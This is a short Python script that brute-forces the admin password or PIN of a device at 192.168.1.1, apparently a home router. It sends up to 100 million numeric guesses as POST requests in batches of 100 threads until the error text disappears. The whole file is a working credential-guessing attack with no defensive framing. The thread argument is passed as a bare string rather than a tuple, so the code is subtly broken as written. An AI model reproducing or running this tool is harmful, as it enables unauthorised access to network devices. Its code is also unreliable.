#!/usr/bin/python
#coding: utf-8

import requests
import threading


def thread_handler(mdp):
    data = {"login": "admin", "password": mdp}
    page = requests.post("http://192.168.1.1/", data)
    if not "Invalid username or PIN." in page.text:
        print("--------" + mdp + "--------")
        global found
        found = True


found = False
n = 0
while n < 100000000:
    th_list = list()
    for i in range(100):
        print("Testing password : " + str(n))
        th = threading.Thread(target=thread_handler, args=(str(n)))
        th_list.append(th)
        th.start()
        n += 1
    for i in th_list:
        i.join()
    if found:
        break
